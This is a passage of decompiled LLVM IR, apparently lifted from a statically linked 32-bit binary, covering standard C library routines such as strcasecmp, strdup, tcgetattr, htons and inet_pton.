  ret i32 %v0_805d6cf

; uselistorder directives
  uselistorder i32 %v1_805d69a, { 1, 2, 0 }
  uselistorder i32 %v1_805d697, { 1, 0, 2 }
  uselistorder i32 %v1_805d643, { 0, 2, 1 }
  uselistorder i32 %v3_805d640, { 1, 0 }
  uselistorder i8** %stack_var_-108, { 4, 3, 2, 1, 0 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_806dac0.705 to i32), { 1, 0, 2 }
  uselistorder i32 %arg2, { 0, 3, 2, 1 }
  uselistorder i32 %arg1, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_805d6cc, { 1, 0 }
  uselistorder label %dec_label_pc_805d6c1, { 1, 0 }
  uselistorder label %dec_label_pc_805d6a5, { 1, 0 }
  uselistorder label %dec_label_pc_805d67e, { 1, 0 }
  uselistorder label %dec_label_pc_805d63d, { 1, 0 }
}

define i32 @bcopy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v2_805d6e8 = inttoptr i32 %arg2 to i8*
  %v3_805d6e8 = call i32 @memmove(i8* %v2_805d6e8, i32 %arg1)
  ret i32 %v3_805d6e8
}

define i32 @__GI_strcasecmp(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_805d6f1 = load i32, i32* bitcast (i32** @global_var_8074fd4.707 to i32*), align 4
  %v4_805d6fa = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_805d702

dec_label_pc_805d702:                             ; preds = %dec_label_pc_805d71f, %entry
  %storemerge = phi i32 [ %v4_805d6fa, %entry ], [ %v1_805d720, %dec_label_pc_805d71f ]
  %v0_805d720 = phi i32 [ %v4_805d6fa, %entry ], [ %v1_805d720, %dec_label_pc_805d71f ]
  %v0_805d7256 = phi i32 [ 0, %entry ], [ %v0_805d7257, %dec_label_pc_805d71f ]
  %v0_805d71f = phi i32 [ %arg2, %entry ], [ %v1_805d71f, %dec_label_pc_805d71f ]
  store i32 %storemerge, i32* @ecx, align 4
  %v12_805d702 = icmp eq i32 %v0_805d720, %v0_805d71f
  %.pre = inttoptr i32 %v0_805d720 to i8*
  br i1 %v12_805d702, label %dec_label_pc_805d71a, label %dec_label_pc_805d706

dec_label_pc_805d706:                             ; preds = %dec_label_pc_805d702
  %v2_805d706 = load i8, i8* %.pre, align 1
  %v3_805d706 = zext i8 %v2_805d706 to i32
  %v2_805d709 = mul nuw nsw i32 %v3_805d706, 2
  %v3_805d709 = add i32 %v2_805d709, %v0_805d6f1
  %v4_805d709 = inttoptr i32 %v3_805d709 to i16*
  %v5_805d709 = load i16, i16* %v4_805d709, align 2
  %v6_805d709 = sext i16 %v5_805d709 to i32
  %v1_805d70d = inttoptr i32 %v0_805d71f to i8*
  %v2_805d70d = load i8, i8* %v1_805d70d, align 1
  %v3_805d70d = zext i8 %v2_805d70d to i32
  %v2_805d710 = mul nuw nsw i32 %v3_805d70d, 2
  %v3_805d710 = add i32 %v2_805d710, %v0_805d6f1
  %v4_805d710 = inttoptr i32 %v3_805d710 to i16*
  %v5_805d710 = load i16, i16* %v4_805d710, align 2
  %v6_805d710 = sext i16 %v5_805d710 to i32
  %v2_805d714 = sub nsw i32 %v6_805d709, %v6_805d710
  %v12_805d714 = icmp eq i32 %v2_805d714, 0
  store i32 %v2_805d714, i32* @edx, align 4
  %v1_805d718 = icmp eq i1 %v12_805d714, false
  br i1 %v1_805d718, label %dec_label_pc_805d723, label %dec_label_pc_805d71a

dec_label_pc_805d71a:                             ; preds = %dec_label_pc_805d702, %dec_label_pc_805d706
  %v0_805d7257 = phi i32 [ %v2_805d714, %dec_label_pc_805d706 ], [ %v0_805d7256, %dec_label_pc_805d702 ]
  %v2_805d71a = load i8, i8* %.pre, align 1
  %v3_805d71a = icmp eq i8 %v2_805d71a, 0
  br i1 %v3_805d71a, label %dec_label_pc_805d723, label %dec_label_pc_805d71f

dec_label_pc_805d71f:                             ; preds = %dec_label_pc_805d71a
  %v1_805d71f = add i32 %v0_805d71f, 1
  %v1_805d720 = add i32 %v0_805d720, 1
  br label %dec_label_pc_805d702

dec_label_pc_805d723:                             ; preds = %dec_label_pc_805d71a, %dec_label_pc_805d706
  %v0_805d725 = phi i32 [ %v0_805d7257, %dec_label_pc_805d71a ], [ %v2_805d714, %dec_label_pc_805d706 ]
  ret i32 %v0_805d725

; uselistorder directives
  uselistorder i32 %v1_805d720, { 1, 0 }
  uselistorder i32 %v0_805d7257, { 1, 0 }
  uselistorder i32 %v2_805d714, { 1, 0, 2, 3 }
  uselistorder i32 %v0_805d71f, { 1, 2, 0 }
  uselistorder i32 %v0_805d720, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805d71a, { 1, 0 }
}

define i32 @__GI_strdup(i8* %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_805d77c = load i32, i32* @edi, align 4
  %v0_805d77d = load i32, i32* @esi, align 4
  %v0_805d77e = load i32, i32* @ebx, align 4
  store i32 %v0_805d77e, i32* %stack_var_-12, align 4
  %v4_805d77f = ptrtoint i8* %arg1 to i32
  store i32 %v4_805d77f, i32* @edi, align 4
  %v3_805d787 = call i32 @strlen(i8* %arg1)
  %v1_805d78c = add i32 %v3_805d787, 1
  store i32 %v1_805d78c, i32* @esi, align 4
  %v2_805d792 = call i32 @malloc(i32 %v1_805d78c)
  %v1_805d79a = icmp eq i32 %v2_805d792, 0
  store i32 %v2_805d792, i32* %ebx.global-to-local, align 4
  br i1 %v1_805d79a, label %dec_label_pc_805d7ac, label %dec_label_pc_805d7a0

dec_label_pc_805d7a0:                             ; preds = %entry
  %v0_805d7a1 = load i32, i32* @esi, align 4
  %v0_805d7a2 = load i32, i32* @edi, align 4
  %tmp13 = inttoptr i32 %v2_805d792 to i16*
  %v6_805d7a4 = call i32 @memcpy(i16* %tmp13, i32 %v0_805d7a2, i32 %v0_805d7a1)
  %v0_805d7ac.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805d7ac

dec_label_pc_805d7ac:                             ; preds = %entry, %dec_label_pc_805d7a0
  %v0_805d7ac = phi i32 [ 0, %entry ], [ %v0_805d7ac.pre, %dec_label_pc_805d7a0 ]
  %v2_805d7ae = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805d7ae, i32* @ebx, align 4
  store i32 %v0_805d77d, i32* @esi, align 4
  store i32 %v0_805d77c, i32* @edi, align 4
  ret i32 %v0_805d7ac

; uselistorder directives
  uselistorder i32 %v2_805d792, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805d7ac, { 1, 0 }
}

define i32 @__GI_strtok(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_805d7c4 = inttoptr i32 %arg1 to i8*
  %v4_805d7c4 = call i32 @strtok_r(i8* %v3_805d7c4, i32 %arg2, i32 ptrtoint (i32* @global_var_807d6a0.708 to i32))
  ret i32 %v4_805d7c4
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-60 = alloca i32, align 4
  %v3_805d7dc = call i32 @__GI_tcgetattr(i32 %arg1, i32* nonnull %stack_var_-60)
  %v1_805d7e1 = icmp eq i32 %v3_805d7dc, 0
  %v1_805d7e3 = zext i1 %v1_805d7e1 to i32
  ret i32 %v1_805d7e3
}

define i32 @__GI_tcgetattr(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_4()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp8 = ptrtoint i32* %arg2 to i32
  %stack_var_-27 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_805d808 = load i32, i32* @esi, align 4
  %v0_805d809 = load i32, i32* @ebx, align 4
  store i32 %v0_805d809, i32* %stack_var_-8, align 4
  %v2_805d80d = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_805d80d, i32* %eax.global-to-local, align 4
  store i32 %tmp8, i32* @ebx, align 4
  %v3_805d81f = call i32 @ioctl(i32 %arg1, i32 21505, i32 %v2_805d80d)
  store i32 %v3_805d81f, i32* %eax.global-to-local, align 4
  %v1_805d827 = icmp eq i32 %v3_805d81f, 0
  store i32 %v3_805d81f, i32* @esi, align 4
  %v1_805d82b = icmp eq i1 %v1_805d827, false
  br i1 %v1_805d82b, label %dec_label_pc_805d870, label %dec_label_pc_805d82d

dec_label_pc_805d82d:                             ; preds = %entry
  %v3_805d82d = load i32, i32* %stack_var_-44, align 4
  %v1_805d831 = load i32, i32* @ebx, align 4
  %v2_805d831 = inttoptr i32 %v1_805d831 to i32*
  store i32 %v3_805d82d, i32* %v2_805d831, align 4
  %v1_805d837 = load i32, i32* @ebx, align 4
  %v2_805d837 = add i32 %v1_805d837, 4
  %v3_805d837 = inttoptr i32 %v2_805d837 to i32*
  %v1_805d83e = load i32, i32* @ebx, align 4
  %v2_805d83e = add i32 %v1_805d83e, 8
  %v3_805d83e = inttoptr i32 %v2_805d83e to i32*
  store i32 %tmp3, i32* %eax.global-to-local, align 4
  %v1_805d845 = load i32, i32* @ebx, align 4
  %v2_805d845 = add i32 %v1_805d845, 12
  %v3_805d845 = inttoptr i32 %v2_805d845 to i32*
  store i32 %tmp3, i32* %v3_805d845, align 4
  %v4_805d848 = zext i8 %tmp to i32
  %v5_805d848 = load i32, i32* %eax.global-to-local, align 4
  %v6_805d848 = and i32 %v5_805d848, -256
  %v7_805d848 = or i32 %v6_805d848, %v4_805d848
  store i32 %v7_805d848, i32* %eax.global-to-local, align 4
  %v2_805d84c = load i32, i32* @ebx, align 4
  %v3_805d84c = add i32 %v2_805d84c, 16
  %v4_805d84c = inttoptr i32 %v3_805d84c to i8*
  store i8 %tmp, i8* %v4_805d84c, align 1
  %v0_805d84f = load i32, i32* %eax.global-to-local, align 4
  %v2_805d852 = ptrtoint i32* %stack_var_-27 to i32
  %v0_805d857 = load i32, i32* @ebx, align 4
  %v1_805d857 = add i32 %v0_805d857, 17
  store i32 %v1_805d857, i32* %eax.global-to-local, align 4
  %v4_805d85b = call i32 @__GI_mempcpy(i32 %v1_805d857, i32 %v2_805d852, i32 19, i32 %v0_805d84f)
  store i32 %v4_805d85b, i32* %eax.global-to-local, align 4
  %v3_805d868 = inttoptr i32 %v4_805d85b to i8*
  %v4_805d868 = call i32 @__GI_memset(i8* %v3_805d868, i32 0, i32 13)
  store i32 %v4_805d868, i32* %eax.global-to-local, align 4
  %v0_805d873.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805d870

dec_label_pc_805d870:                             ; preds = %entry, %dec_label_pc_805d82d
  %v0_805d873 = phi i32 [ %v3_805d81f, %entry ], [ %v0_805d873.pre, %dec_label_pc_805d82d ]
  store i32 %v0_805d873, i32* %eax.global-to-local, align 4
  %v2_805d875 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805d875, i32* @ebx, align 4
  store i32 %v0_805d808, i32* @esi, align 4
  ret i32 %v0_805d873

; uselistorder directives
  uselistorder i32 %v0_805d873, { 1, 0 }
  uselistorder i32 %tmp3, { 1, 0 }
  uselistorder i8 %tmp, { 1, 0 }
  uselistorder i32* %eax.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 0, 1 }
  uselistorder label %dec_label_pc_805d870, { 1, 0 }
}

define i32 @htons(i16 %arg1) local_unnamed_addr {
entry:
  %v3_805d87d = call i16 @llvm.bswap.i16(i16 %arg1)
  %v4_805d87d = zext i16 %v3_805d87d to i32
  ret i32 %v4_805d87d
}

define i32 @inet_pton4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 0, i32* @edx, align 4
  %v0_805e5aa = load i32, i32* @esi, align 4
  store i32 0, i32* @edi, align 4
  %v0_805e5ad = load i32, i32* @ebx, align 4
  store i32 %v0_805e5ad, i32* %stack_var_-16, align 4
  %v0_805e5ae = load i32, i32* @eax, align 4
  store i32 %v0_805e5ae, i32* %ebx.global-to-local, align 4
  store i1 false, i1* %zf.global-to-local, align 1
  %v15_805e5b0 = ptrtoint i32* %stack_var_-44 to i32
  %v2_805e5b3 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_805e5b3, i32* @esi, align 4
  store i32 0, i32* %stack_var_-20, align 4
  %v1_805e5fb15 = inttoptr i32 %v0_805e5ae to i8*
  %v2_805e5fb16 = load i8, i8* %v1_805e5fb15, align 1
  %v3_805e5fb17 = sext i8 %v2_805e5fb16 to i32
  store i32 %v3_805e5fb17, i32* @ecx, align 4
  %v1_805e5fe18 = add i32 %v0_805e5ae, 1
  store i32 %v1_805e5fe18, i32* %ebx.global-to-local, align 4
  %v1_805e5ff19 = icmp eq i8 %v2_805e5fb16, 0
  store i1 %v1_805e5ff19, i1* %zf.global-to-local, align 1
  %v1_805e60121 = icmp eq i1 %v1_805e5ff19, false
  br i1 %v1_805e60121, label %dec_label_pc_805e5be, label %dec_label_pc_805e603.thread

dec_label_pc_805e603.thread:                      ; preds = %entry
  store i1 false, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_805e620

dec_label_pc_805e5be:                             ; preds = %entry, %dec_label_pc_805e5fb.backedge
  %v3_805e5fb23 = phi i32 [ %v3_805e5fb, %dec_label_pc_805e5fb.backedge ], [ %v3_805e5fb17, %entry ]
  %v2_805e5fb22 = phi i8 [ %v2_805e5fb, %dec_label_pc_805e5fb.backedge ], [ %v2_805e5fb16, %entry ]
  %v1_805e5be = add nsw i32 %v3_805e5fb23, -48
  store i32 %v1_805e5be, i32* %eax.global-to-local, align 4
  %v9_805e5c1 = icmp eq i8 %v2_805e5fb22, 57
  store i1 %v9_805e5c1, i1* %zf.global-to-local, align 1
  %v6_805e5c4 = icmp ugt i32 %v1_805e5be, 9
  br i1 %v6_805e5c4, label %dec_label_pc_805e5e7, label %dec_label_pc_805e5c6

dec_label_pc_805e5c6:                             ; preds = %dec_label_pc_805e5be
  %v0_805e5c6 = load i32, i32* @esi, align 4
  %v1_805e5c6 = inttoptr i32 %v0_805e5c6 to i8*
  %v2_805e5c6 = load i8, i8* %v1_805e5c6, align 1
  %v2_805e5c9 = zext i8 %v2_805e5c6 to i32
  %v3_805e5c9 = mul nuw nsw i32 %v2_805e5c9, 10
  %v3_805e5cc = add nsw i32 %v3_805e5c9, %v1_805e5be
  store i32 %v3_805e5cc, i32* %eax.global-to-local, align 4
  %v9_805e5d0 = icmp eq i32 %v3_805e5cc, 255
  store i1 %v9_805e5d0, i1* %zf.global-to-local, align 1
  %v6_805e5d5 = icmp ugt i32 %v3_805e5cc, 255
  br i1 %v6_805e5d5, label %dec_label_pc_805e620, label %dec_label_pc_805e5d7

dec_label_pc_805e5d7:                             ; preds = %dec_label_pc_805e5c6
  %v0_805e5d7 = load i32, i32* @edx, align 4
  %v1_805e5d7 = icmp eq i32 %v0_805e5d7, 0
  store i1 %v1_805e5d7, i1* %zf.global-to-local, align 1
  %v1_805e5d9 = trunc i32 %v3_805e5cc to i8
  store i8 %v1_805e5d9, i8* %v1_805e5c6, align 1
  %v0_805e5db = load i1, i1* %zf.global-to-local, align 1
  %v1_805e5db = icmp eq i1 %v0_805e5db, false
  br i1 %v1_805e5db, label %dec_label_pc_805e5fb.backedge, label %dec_label_pc_805e5dd

dec_label_pc_805e5dd:                             ; preds = %dec_label_pc_805e5d7
  %v0_805e5dd = load i32, i32* @edi, align 4
  %v1_805e5dd = add i32 %v0_805e5dd, 1
  store i32 %v1_805e5dd, i32* @edi, align 4
  %v1_805e5de = add i32 %v0_805e5dd, -3
  %v6_805e5de = sub i32 2, %v0_805e5dd
  %v7_805e5de = and i32 %v6_805e5de, %v1_805e5dd
  %v8_805e5de = icmp slt i32 %v7_805e5de, 0
  %v9_805e5de = icmp eq i32 %v1_805e5de, 0
  store i1 %v9_805e5de, i1* %zf.global-to-local, align 1
  %v10_805e5de = icmp slt i32 %v1_805e5de, 0
  %v3_805e5e1 = icmp eq i1 %v10_805e5de, %v8_805e5de
  %v4_805e5e1 = icmp eq i1 %v9_805e5de, false
  %v5_805e5e1 = and i1 %v4_805e5e1, %v3_805e5e1
  br i1 %v5_805e5e1, label %dec_label_pc_805e620, label %dec_label_pc_805e5e3

dec_label_pc_805e5e3:                             ; preds = %dec_label_pc_805e5dd
  %v0_805e5e3 = load i32, i32* @edx, align 4
  %v1_805e5e3 = and i32 %v0_805e5e3, -256
  %v2_805e5e3 = or i32 %v1_805e5e3, 1
  store i32 %v2_805e5e3, i32* @edx, align 4
  br label %dec_label_pc_805e5fb.backedge

dec_label_pc_805e5e7:                             ; preds = %dec_label_pc_805e5be
  %v9_805e5e7 = icmp eq i8 %v2_805e5fb22, 46
  store i1 %v9_805e5e7, i1* %zf.global-to-local, align 1
  %v1_805e5ea = icmp eq i1 %v9_805e5e7, false
  br i1 %v1_805e5ea, label %dec_label_pc_805e620, label %dec_label_pc_805e5ec

dec_label_pc_805e5ec:                             ; preds = %dec_label_pc_805e5e7
  %v0_805e5ec = load i32, i32* @edx, align 4
  %v1_805e5ec = icmp eq i32 %v0_805e5ec, 0
  store i1 %v1_805e5ec, i1* %zf.global-to-local, align 1
  br i1 %v1_805e5ec, label %dec_label_pc_805e620, label %dec_label_pc_805e5f0

dec_label_pc_805e5f0:                             ; preds = %dec_label_pc_805e5ec
  %v0_805e5f0 = load i32, i32* @edi, align 4
  %v9_805e5f0 = icmp eq i32 %v0_805e5f0, 4
  store i1 %v9_805e5f0, i1* %zf.global-to-local, align 1
  br i1 %v9_805e5f0, label %dec_label_pc_805e620, label %dec_label_pc_805e5f5

dec_label_pc_805e5f5:                             ; preds = %dec_label_pc_805e5f0
  %v0_805e5f5 = load i32, i32* @esi, align 4
  %v1_805e5f5 = add i32 %v0_805e5f5, 1
  store i32 %v1_805e5f5, i32* @esi, align 4
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* @edx, align 4
  %v1_805e5f8 = inttoptr i32 %v1_805e5f5 to i8*
  store i8 0, i8* %v1_805e5f8, align 1
  br label %dec_label_pc_805e5fb.backedge

dec_label_pc_805e5fb.backedge:                    ; preds = %dec_label_pc_805e5f5, %dec_label_pc_805e5e3, %dec_label_pc_805e5d7
  %v0_805e5fb.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_805e5fb = inttoptr i32 %v0_805e5fb.pre to i8*
  %v2_805e5fb = load i8, i8* %v1_805e5fb, align 1
  %v3_805e5fb = sext i8 %v2_805e5fb to i32
  store i32 %v3_805e5fb, i32* @ecx, align 4
  %v1_805e5fe = add i32 %v0_805e5fb.pre, 1
  store i32 %v1_805e5fe, i32* %ebx.global-to-local, align 4
  %v1_805e5ff = icmp eq i8 %v2_805e5fb, 0
  store i1 %v1_805e5ff, i1* %zf.global-to-local, align 1
  %v1_805e601 = icmp eq i1 %v1_805e5ff, false
  br i1 %v1_805e601, label %dec_label_pc_805e5be, label %dec_label_pc_805e603

dec_label_pc_805e603:                             ; preds = %dec_label_pc_805e5fb.backedge
  %v0_805e603.pre = load i32, i32* @edi, align 4
  %v10_805e603 = icmp eq i32 %v0_805e603.pre, 3
  store i1 %v10_805e603, i1* %zf.global-to-local, align 1
  %v7_805e606 = icmp sgt i32 %v0_805e603.pre, 3
  br i1 %v7_805e606, label %dec_label_pc_805e608, label %dec_label_pc_805e620

dec_label_pc_805e608:                             ; preds = %dec_label_pc_805e603
  %v0_805e608 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v2_805e5b3, i32* %eax.global-to-local, align 4
  %v3_805e611 = bitcast i32* %stack_var_-20 to i16*
  %v4_805e611 = call i32 @memcpy(i16* %v3_805e611, i32 4, i32 %v0_805e608)
  store i32 1, i32* %eax.global-to-local, align 4
  %v0_805e61b = load i32, i32* @esp, align 4
  %v6_805e61b = icmp eq i32 %v0_805e61b, -16
  store i1 %v6_805e61b, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_805e622

dec_label_pc_805e620:                             ; preds = %dec_label_pc_805e5f0, %dec_label_pc_805e5ec, %dec_label_pc_805e5e7, %dec_label_pc_805e5dd, %dec_label_pc_805e5c6, %dec_label_pc_805e603.thread, %dec_label_pc_805e603
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_805e622.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805e622

dec_label_pc_805e622:                             ; preds = %dec_label_pc_805e608, %dec_label_pc_805e620
  %v0_805e622 = phi i32 [ %v15_805e5b0, %dec_label_pc_805e608 ], [ %v0_805e622.pre, %dec_label_pc_805e620 ]
  %v0_805e629 = phi i32 [ 1, %dec_label_pc_805e608 ], [ 0, %dec_label_pc_805e620 ]
  %v9_805e622 = icmp eq i32 %v0_805e622, -28
  store i1 %v9_805e622, i1* %zf.global-to-local, align 1
  %v2_805e625 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_805e625, i32* @ebx, align 4
  store i32 %v0_805e5aa, i32* @esi, align 4
  ret i32 %v0_805e629

; uselistorder directives
  uselistorder i32 %v0_805e603.pre, { 1, 0 }
  uselistorder i32 %v3_805e5fb, { 1, 0 }
  uselistorder i8 %v2_805e5fb, { 1, 2, 0 }
  uselistorder i1 %v9_805e5f0, { 1, 0 }
  uselistorder i32 %v1_805e5de, { 1, 0 }
  uselistorder i32 %v3_805e5cc, { 1, 2, 0, 3 }
  uselistorder i8 %v2_805e5fb22, { 1, 0 }
  uselistorder i1* %zf.global-to-local, { 2, 3, 4, 5, 15, 6, 7, 8, 9, 10, 11, 12, 13, 14, 1, 0, 16 }
  uselistorder i32* %ebx.global-to-local, { 2, 1, 0, 3 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder label %dec_label_pc_805e622, { 1, 0 }
  uselistorder label %dec_label_pc_805e620, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_805e5be, { 1, 0 }
}

define i32 @inet_pton(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_805e62a = load i32, i32* @ebp, align 4
  %v0_805e62b = load i32, i32* @edi, align 4
  %v0_805e62c = load i32, i32* @esi, align 4
  %v0_805e62d = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v4_805e635 = ptrtoint i8* %arg2 to i32
  store i32 %v4_805e635, i32* @edi, align 4
  %v9_805e639 = icmp eq i32 %arg1, 2
  br i1 %v9_805e639, label %dec_label_pc_805e649, label %dec_label_pc_805e63e

dec_label_pc_805e63e:                             ; preds = %entry
  %v9_805e63e = icmp eq i32 %arg1, 10
  %v1_805e641 = icmp eq i1 %v9_805e63e, false
  br i1 %v1_805e641, label %dec_label_pc_805e7da, label %dec_label_pc_805e659

dec_label_pc_805e649:                             ; preds = %entry
  store i32 %arg3, i32* @edx, align 4
  store i32 %v4_805e635, i32* @eax, align 4
  %v3_805e64f = call i32 @inet_pton4(i32 %v0_805e62d, i32 %v0_805e62c, i32 %v0_805e62b)
  store i32 %v3_805e64f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805e7ec

dec_label_pc_805e659:                             ; preds = %dec_label_pc_805e63e
  %v2_805e65e = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_805e65e, i32* %eax.global-to-local, align 4
  %tmp60 = bitcast i32* %stack_var_-32 to i8*
  %v5_805e663 = call i32 @__GI_memset(i8* %tmp60, i32 0, i32 16)
  store i32 %v5_805e663, i32* @ebx, align 4
  %v2_805e66a = add i32 %v5_805e663, 16
  store i32 %v2_805e66a, i32* %eax.global-to-local, align 4
  %v0_805e674 = load i32, i32* @edi, align 4
  %v1_805e674 = inttoptr i32 %v0_805e674 to i8*
  %v2_805e674 = load i8, i8* %v1_805e674, align 1
  %v11_805e674 = icmp eq i8 %v2_805e674, 58
  %v1_805e677 = icmp eq i1 %v11_805e674, false
  br i1 %v1_805e677, label %dec_label_pc_805e70a, label %dec_label_pc_805e679

dec_label_pc_805e679:                             ; preds = %dec_label_pc_805e659
  %v1_805e679 = add i32 %v0_805e674, 1
  store i32 %v1_805e679, i32* @edi, align 4
  %v1_805e67a = inttoptr i32 %v1_805e679 to i8*
  %v2_805e67a = load i8, i8* %v1_805e67a, align 1
  %v11_805e67a = icmp eq i8 %v2_805e67a, 58
  %v1_805e67d = icmp eq i1 %v11_805e67a, false
  br i1 %v1_805e67d, label %dec_label_pc_805e7ea, label %dec_label_pc_805e70a

dec_label_pc_805e691:                             ; preds = %dec_label_pc_805e74a
  %v0_805e692 = load i32, i32* @edi, align 4
  %v1_805e692 = add i32 %v0_805e692, 1
  store i32 %v1_805e692, i32* @edi, align 4
  %v4_805e69a = call i32 @__GI_strchr(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_806e8d7.717, i32 0, i32 0), i32 %v2_805e751)
  store i32 %v4_805e69a, i32* %eax.global-to-local, align 4
  %v1_805e6a2 = icmp eq i32 %v4_805e69a, 0
  br i1 %v1_805e6a2, label %dec_label_pc_805e6c1, label %dec_label_pc_805e6a6

dec_label_pc_805e6a6:                             ; preds = %dec_label_pc_805e691
  %v0_805e6a6 = load i32, i32* @ebp, align 4
  %v2_805e6a6 = mul i32 %v0_805e6a6, 16
  %v1_805e6a9 = add i32 %v4_805e69a, -134670551
  store i32 %v1_805e6a9, i32* %eax.global-to-local, align 4
  %v2_805e6ae = or i32 %v2_805e6a6, %v1_805e6a9
  store i32 %v2_805e6ae, i32* @ebp, align 4
  %tmp = icmp ult i32 %v2_805e6ae, 65536
  br i1 %tmp, label %dec_label_pc_805e6a6.dec_label_pc_805e74a.outer_crit_edge, label %dec_label_pc_805e7ea

dec_label_pc_805e6a6.dec_label_pc_805e74a.outer_crit_edge: ; preds = %dec_label_pc_805e6a6
  %v0_805e74a.pre.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805e74a.outer

dec_label_pc_805e74a.outer:                       ; preds = %dec_label_pc_805e6a6.dec_label_pc_805e74a.outer_crit_edge, %dec_label_pc_805e70a
  %v0_805e74a.pre = phi i32 [ %v0_805e74a.pre.pre, %dec_label_pc_805e6a6.dec_label_pc_805e74a.outer_crit_edge ], [ %stack_var_-36.0.in, %dec_label_pc_805e70a ]
  %stack_var_-44.1.ph = phi i8* [ %stack_var_-44.1, %dec_label_pc_805e6a6.dec_label_pc_805e74a.outer_crit_edge ], [ %stack_var_-44.0, %dec_label_pc_805e70a ]
  %stack_var_-36.1.ph = phi i8* [ %stack_var_-36.1, %dec_label_pc_805e6a6.dec_label_pc_805e74a.outer_crit_edge ], [ %stack_var_-36.0, %dec_label_pc_805e70a ]
  %stack_var_-48.0.ph = phi i32 [ 1, %dec_label_pc_805e6a6.dec_label_pc_805e74a.outer_crit_edge ], [ 0, %dec_label_pc_805e70a ]
  %v4_805e6c6 = icmp eq i32 %stack_var_-48.0.ph, 0
  %v1_805e6cb = icmp eq i1 %v4_805e6c6, false
  br label %dec_label_pc_805e74a

dec_label_pc_805e6c1:                             ; preds = %dec_label_pc_805e691
  %v0_805e6c1 = load i32, i32* @esi, align 4
  %v9_805e6c1 = icmp eq i32 %v0_805e6c1, 58
  %v1_805e6c4 = icmp eq i1 %v9_805e6c1, false
  br i1 %v1_805e6c4, label %dec_label_pc_805e716, label %dec_label_pc_805e6c6

dec_label_pc_805e6c6:                             ; preds = %dec_label_pc_805e6c1
  br i1 %v1_805e6cb, label %dec_label_pc_805e6e2, label %dec_label_pc_805e6cd

dec_label_pc_805e6cd:                             ; preds = %dec_label_pc_805e6c6
  %v5_805e6cd = icmp eq i8* %stack_var_-44.1, null
  %v1_805e6d2 = icmp eq i1 %v5_805e6cd, false
  br i1 %v1_805e6d2, label %dec_label_pc_805e7ea, label %dec_label_pc_805e6d8

dec_label_pc_805e6d8:                             ; preds = %dec_label_pc_805e6cd
  %v0_805e6d8 = load i32, i32* @ebx, align 4
  %v5_805e6d8 = inttoptr i32 %v0_805e6d8 to i8*
  %v0_805e6dc = load i32, i32* @edi, align 4
  %v5_805e6dc = inttoptr i32 %v0_805e6dc to i8*
  br label %dec_label_pc_805e74a

dec_label_pc_805e6e2:                             ; preds = %dec_label_pc_805e6c6
  %v0_805e6e2 = load i32, i32* @edi, align 4
  %v1_805e6e2 = inttoptr i32 %v0_805e6e2 to i8*
  %v2_805e6e2 = load i8, i8* %v1_805e6e2, align 1
  %v3_805e6e2 = icmp eq i8 %v2_805e6e2, 0
  br i1 %v3_805e6e2, label %dec_label_pc_805e7ea, label %dec_label_pc_805e6eb

dec_label_pc_805e6eb:                             ; preds = %dec_label_pc_805e6e2
  %v0_805e6eb = load i32, i32* @ebx, align 4
  %v1_805e6eb = add i32 %v0_805e6eb, 2
  store i32 %v1_805e6eb, i32* @edx, align 4
  %v6_805e6f2 = icmp ugt i32 %v1_805e6eb, %v2_805e66a
  br i1 %v6_805e6f2, label %dec_label_pc_805e7ea, label %dec_label_pc_805e6f8

dec_label_pc_805e6f8:                             ; preds = %dec_label_pc_805e6eb
  %v0_805e6f8 = load i32, i32* @ebp, align 4
  %v2_805e6fa = udiv i32 %v0_805e6f8, 256
  %v4_805e6fa = trunc i32 %v2_805e6fa to i8
  %v3_805e6fd = inttoptr i32 %v0_805e6eb to i8*
  store i8 %v4_805e6fa, i8* %v3_805e6fd, align 1
